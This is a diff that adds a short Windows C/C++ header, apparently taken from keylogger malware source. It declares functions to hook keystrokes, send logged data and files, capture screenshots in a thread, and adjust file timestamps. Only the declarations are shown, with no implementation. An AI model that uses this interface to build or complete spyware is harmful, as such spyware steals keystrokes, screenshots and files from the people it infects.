@@ -1,0 +1,19 @@
+#ifndef		KeyLoggerH
+#define		KeyLoggerH
+
+#include <windows.h>
+
+
+//*********************************************************************
+bool UnHookKeyLogger_();
+
+//*********************************************************************
+bool HookKeyLogger();
+
+//*********************************************************************
+bool WINAPI IsKeyLoggerProcess();
+void SendLoadedFiles();
+LPBYTE SendKeyLogerData(int FlagFolderDest,WCHAR *Path, WCHAR *Ext);
+DWORD WINAPI SetScreensThread( LPVOID lpData );
+bool Time_Correct(FILETIME CreationTime);
+#endif		
